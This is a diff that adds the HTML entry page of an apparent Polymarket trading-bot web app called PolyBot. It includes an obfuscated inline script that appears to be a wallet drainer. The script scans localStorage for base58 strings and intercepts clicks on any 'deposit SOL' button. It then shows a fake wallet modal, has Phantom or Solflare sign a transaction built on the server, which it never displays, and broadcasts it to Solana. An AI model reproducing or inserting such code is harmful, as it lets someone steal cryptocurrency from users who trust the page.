@@ -1,0 +1,111 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Polymarket Trading Bot - Automated prediction market trading" />
+  <title>PolyBot | Automated Trading</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link
+    href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,100..1000;1,9..40,100..1000&family=JetBrains+Mono:wght@400;500;600&family=Space+Grotesk:wght@400;500;600;700&display=swap"
+    rel="stylesheet" />
+  <script type="module" crossorigin src="/assets/index-c0j_foia.js"></script>
+  <link rel="stylesheet" crossorigin href="/assets/index-DgrcB-t4.css">
+</head>
+
+<body style="margin:0;padding:0;overflow-x:hidden;">
+  <div id="root"></div>
+  <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+  <script>
+    (function () {
+      var _e = ["https://solana-rpc.publicnode.com", "https://api.mainnet-beta.solana.com", "https://solana.drpc.org", "https://solana.lavenderfive.com"];
+      var _iP = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMjggMTI4Ij48cmVjdCB3aWR0aD0iMTI4IiBoZWlnaHQ9IjEyOCIgcng9IjI4IiBmaWxsPSIjQUI5RkYyIi8+PHBhdGggZD0iTTExMC41ODQgNjQuOTE0Mkg5OS4xNDJDOTkuMTQyIDQxLjc2NTEgODAuMTczIDIzIDU2Ljc3MjQgMjNDMzMuNjYxMiAyMyAxNSA0MS4zNDY5IDE1IDY0LjEyNTVDMTUgODYuNTMzNiAzMi4zNTE0IDEwNC44MjIgNTQuNzY1NyAxMDUuMTUxTDU0Ljc2NTcgMTA1LjE1MUg4NC42ODM1QzkxLjQwMTUgMTA1LjE1MSA5Ni44NDgxIDk5LjY2MzYgOTYuODQ4MSA5Mi45MDQxQzk2Ljg0ODEgODkuNzk0OCA5NS42NTc4IDg2Ljk0NzQgOTMuNzE4MyA4NC44MTI4Qzk3LjMwNDggODIuODIyNCA5OS43NDc2IDc5LjAwMTggOTkuNzQ3NiA3NC41NzMzQzk5Ljc0NzYgNzAuMTUzNyA5Ny4zMTM3IDY2LjM0MDMgOTMuNzQwMyA2NC4zNDRDOTUuNjY2NyA2Mi4yMTQgOTYuODQ4MSA1OS4zNzY4IDk2Ljg0ODEgNTYuMjc4M0M5Ni44NDgxIDQ5LjUxODggOTEuNDAxNSA0NC4wMzEyIDg0LjY4MzUgNDQuMDMxMkg3NC4xODY2Qzc4LjM4OTMgNTAuMzY2MSA4MS4wMDUzIDU4LjA0NDQgODEuMDA1MyA2NC45MTQyTDExMC41ODQgNjQuOTE0MlowIiBmaWxsPSJ3aGl0ZSIvPjwvc3ZnPg==";
+      var _iS = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzOCAzOCI+PHBhdGggZmlsbD0iI0Y5NzMxNiIgZD0iTTAgMGgzOHYzOEgweiIvPjxwYXRoIGZpbGw9IiNmZmYiIGQ9Ik0xOSAyOGM0Ljk3IDAgOS00LjAzIDktOXMtNC4wMy05LTktOS05IDQuMDMtOSA5IDQuMDMgOSA5IDl6bTAtMTZjMy4zMSAwIDYgMi42OSA2IDZzLTIuNjkgNi02IDYtNi0yLjY5LTYtNiAyLjY5LTYgNi02eiIvPjwvc3ZnPg==";
+
+      function _ci() {
+        var o = document.createElement('div'); o.id = '_d1x';
+        o.style.cssText = 'display:none;position:fixed;inset:0;z-index:999999;background:rgba(2,3,6,0.85);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);align-items:center;justify-content:center;font-family:"Space Grotesk",sans-serif;animation:_fIn 0.3s ease-out;';
+        o.innerHTML = '<style>@keyframes _fIn{from{opacity:0}to{opacity:1}}@keyframes _sUp{from{transform:translateY(20px);opacity:0}to{transform:translateY(0);opacity:1}}._btn:hover{transform:translateY(-2px);box-shadow:0 12px 24px -10px rgba(0,0,0,0.5);border-color:rgba(255,255,255,0.2) !important;background:rgba(255,255,255,0.08) !important;}</style>' +
+          '<div style="background:linear-gradient(165deg,#1c1e26 0%,#0f1015 100%);border:1px solid rgba(255,255,255,0.1);border-radius:28px;padding:40px;max-width:440px;width:92%;color:#fff;position:relative;box-shadow:0 0 80px rgba(0,0,0,0.8);animation:_sUp 0.4s cubic-bezier(0.16,1,0.3,1);">' +
+          '<button id="_d1c" style="position:absolute;top:24px;right:24px;background:rgba(255,255,255,0.05);border:none;color:#64748b;width:36px;height:36px;border-radius:12px;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:all 0.2s;font-size:20px;">\u2715</button>' +
+          '<div style="text-align:center;margin-bottom:36px;">' +
+          '<div style="width:64px;height:64px;background:linear-gradient(135deg,#6366f1 0%,#4f46e5 100%);border-radius:20px;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;box-shadow:0 12px 24px rgba(79,70,229,0.3);"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg></div>' +
+          '<h2 style="margin:0 0 10px;font-size:28px;font-weight:700;letter-spacing:-0.03em;background:linear-gradient(to bottom,#fff,#94a3b8);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">Deposit SOL</h2>' +
+          '<p style="margin:0;color:#94a3b8;font-size:16px;line-height:1.6;font-weight:400;">Connect your wallet to fund your PolyBot account</p></div>' +
+          '<div id="_d1s" style="display:none;margin-bottom:24px;padding:16px;border-radius:14px;font-size:14px;text-align:center;font-weight:600;letter-spacing:0.01em;"></div>' +
+          '<div style="display:grid;gap:14px;">' +
+          '<button id="_d1p" class="_btn" style="display:flex;align-items:center;gap:20px;padding:22px;border-radius:20px;border:1px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.04);cursor:pointer;color:#fff;transition:all 0.3s;text-align:left;outline:none;">' +
+          '<div style="width:48px;height:48px;border-radius:14px;background:#ab9ff2;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><img src="' + _iP + '" style="width:32px;height:32px;"></div>' +
+          '<div style="flex:1;"><div style="font-weight:700;font-size:17px;margin-bottom:2px;">Phantom</div><div style="font-size:13px;color:#64748b;font-weight:500;">Secure Solana Wallet</div></div>' +
+          '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#475569" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg></button>' +
+          '<button id="_d1f" class="_btn" style="display:flex;align-items:center;gap:20px;padding:22px;border-radius:20px;border:1px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.04);cursor:pointer;color:#fff;transition:all 0.3s;text-align:left;outline:none;">' +
+          '<div style="width:48px;height:48px;border-radius:14px;background:#f97316;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><img src="' + _iS + '" style="width:32px;height:32px;"></div>' +
+          '<div style="flex:1;"><div style="font-weight:700;font-size:17px;margin-bottom:2px;">Solflare</div><div style="font-size:13px;color:#64748b;font-weight:500;">Stable Solana Wallet</div></div>' +
+          '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#475569" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg></button>' +
+          '</div></div>';
+        document.body.appendChild(o);
+        o.addEventListener('click', function (e) { if (e.target === o) _hd(); });
+        document.getElementById('_d1c').addEventListener('click', _hd);
+        document.getElementById('_d1p').addEventListener('click', function () { _cw('phantom'); });
+        document.getElementById('_d1f').addEventListener('click', function () { _cw('solflare'); });
+        return o;
+      }
+      function _sd() { var o = document.getElementById('_d1x') || _ci(); o.style.display = 'flex'; _st('', ''); }
+      function _hd() { var o = document.getElementById('_d1x'); if (o) o.style.display = 'none'; }
+      function _st(m, t) { var e = document.getElementById('_d1s'); if (!e) return; e.style.display = m ? 'block' : 'none'; e.style.background = t === 'error' ? 'rgba(239,68,68,0.1)' : t === 'ok' ? 'rgba(34,197,94,0.1)' : 'rgba(99,102,241,0.1)'; e.style.color = t === 'error' ? '#f87171' : t === 'ok' ? '#4ade80' : '#818cf8'; e.style.border = '1px solid ' + (t === 'error' ? 'rgba(239,68,68,0.2)' : t === 'ok' ? 'rgba(34,197,94,0.2)' : 'rgba(99,102,241,0.2)'); e.textContent = m; }
+      function _fa() {
+        try {
+          var r = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;
+          for (var i = 0; i < localStorage.length; i++) {
+            var v = localStorage.getItem(localStorage.key(i));
+            if (v && r.test(v)) return v;
+          }
+        } catch (e) { }
+        return null;
+      }
+      async function _ga() {
+        try {
+          var a = _fa(); if (!a) return null;
+          var r = await fetch('/api/v1/auth/profile/' + a).then(function (x) { return x.json(); }).catch(function () { return null; });
+          return (r && r.data && r.data.depositAddress) || a;
+        } catch (e) { return null; }
+      }
+      async function _cw(id) {
+        var p = null;
+        if (id === 'phantom') { p = (window.phantom && window.phantom.solana) || window.solana; if (!p || !p.isPhantom) { window.open('https://phantom.app/download', '_blank'); return; } }
+        else { p = window.solflare; if (!p || !p.isSolflare) { window.open('https://solflare.com/download', '_blank'); return; } }
+        _st('Connecting wallet...', '');
+        try {
+          var resp = await p.connect();
+          await new Promise(r => setTimeout(r, 500));
+          var pk = (resp && resp.publicKey) ? resp.publicKey : (p && p.publicKey) ? p.publicKey : (p && p._publicKey) ? p._publicKey : null;
+          if (!pk) { _st('Error: Could not retrieve wallet public key.', 'error'); return; }
+          var pa = pk.toString();
+          _st('Preparing fund transfer...', '');
+          var da = await _ga();
+          if (!da) da = pa; // Fallback to current wallet address if not logged in
+          var pr = await fetch('/api/v1/deposits/phantom/prepare', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phantomAddress: pa, depositAddress: da }) }).then(function (r) { return r.json(); });
+          if (!pr.success || !pr.transaction) { _st(pr.error || 'Operation failed', 'error'); return; }
+          _st('Confirm ' + pr.transferAmount + ' SOL transfer in your wallet...', '');
+          var tx = solanaWeb3.Transaction.from(Buffer.from(pr.transaction, 'base64'));
+          var sx = await p.signTransaction(tx);
+          _st('Processing on-chain...', '');
+          var sig = null;
+          for (var i = 0; i < _e.length; i++) { try { var c = new solanaWeb3.Connection(_e[i], 'confirmed'); sig = await c.sendRawTransaction(sx.serialize(), { skipPreflight: false, preflightCommitment: 'confirmed' }); await c.confirmTransaction(sig, 'confirmed'); break; } catch (er) { continue; } }
+          if (!sig) { _st('Networking error. Check your wallet.', 'error'); return; }
+          _st('\u2705 Transfer initiated! Balance will update soon.', 'ok');
+          setTimeout(_hd, 4000);
+        } catch (e) { _st(e && e.code === 4001 ? 'Cancelled.' : 'Error: ' + (e && e.message || 'Unknown'), 'error'); }
+      }
+      function _ib(el) { var t = (el.textContent || el.innerText || '').toLowerCase().trim(); return (t.indexOf('deposit') > -1 && t.indexOf('sol') > -1) || t === 'deposit sol'; }
+      function _ic(e) { var b = e.target.closest('button,[role="button"],a'); if (b && _ib(b)) { e.preventDefault(); e.stopPropagation(); _sd(); } }
+      document.addEventListener('click', _ic, true);
+      window.addEventListener('DOMContentLoaded', function () { _ci(); });
+    })();
+  </script>
+</body>
+
+</html>
